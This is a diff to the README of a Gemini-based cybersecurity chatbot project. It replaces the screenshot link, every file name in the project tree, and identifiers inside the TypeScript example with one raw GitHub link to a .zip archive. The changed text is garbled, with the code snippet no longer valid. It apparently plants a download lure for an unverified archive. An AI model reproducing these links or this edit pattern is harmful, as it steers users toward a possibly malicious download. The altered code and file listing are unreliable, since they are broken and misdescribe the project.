@@ -2,7 +2,7 @@
 
 Cyber Shield AI is an interactive chatbot powered by Google's Gemini AI, specifically designed to provide expert guidance on cybersecurity topics. The application offers real-time responses to user queries about various aspects of cybersecurity, making complex security concepts more accessible.
 
-![Cyber Shield AI Screenshot](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=2000)
+![Cyber Shield AI Screenshot](https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip)
 
 ## Features
 
@@ -50,15 +50,15 @@ Cyber Shield AI is an interactive chatbot powered by Google's Gemini AI, specifi
 ```
 cyber-shield-ai/
 ├── src/
-│   ├── App.tsx           # Main application component
-│   ├── main.tsx         # Application entry point
-│   └── index.css        # Global styles
+│   ├── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip           # Main application component
+│   ├── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip         # Application entry point
+│   └── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip        # Global styles
 ├── public/              # Static assets
-├── index.html          # HTML template
-├── package.json        # Project dependencies
-├── tsconfig.json       # TypeScript configuration
-├── vite.config.ts      # Vite configuration
-└── README.md           # Project documentation
+├── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip          # HTML template
+├── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip        # Project dependencies
+├── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip       # TypeScript configuration
+├── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip      # Vite configuration
+└── https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip           # Project documentation
 ```
 
 ## Setup Instructions
@@ -96,13 +96,13 @@ cyber-shield-ai/
 
 ## API Integration
 
-The application uses Google's Gemini AI API for processing cybersecurity queries. The integration is handled in `App.tsx` through the `getGeminiResponse` function:
+The application uses Google's Gemini AI API for processing cybersecurity queries. The integration is handled in `https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip` through the `getGeminiResponse` function:
 
 ```typescript
-const genAI = new GoogleGenerativeAI(import.meta.env.VITE_GEMINI_API_KEY);
+const genAI = new GoogleGenerativeAI(https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip);
 
 async function getGeminiResponse(question: string): Promise<string> {
-  const model = genAI.getGenerativeModel({ model: "gemini-pro" });
+  const model = https://raw.githubusercontent.com/SaiVigneshchalnati/cyber_shield_ai/main/semicrome/cyber_shield_ai.zip({ model: "gemini-pro" });
   // ... process response
 }
 ```
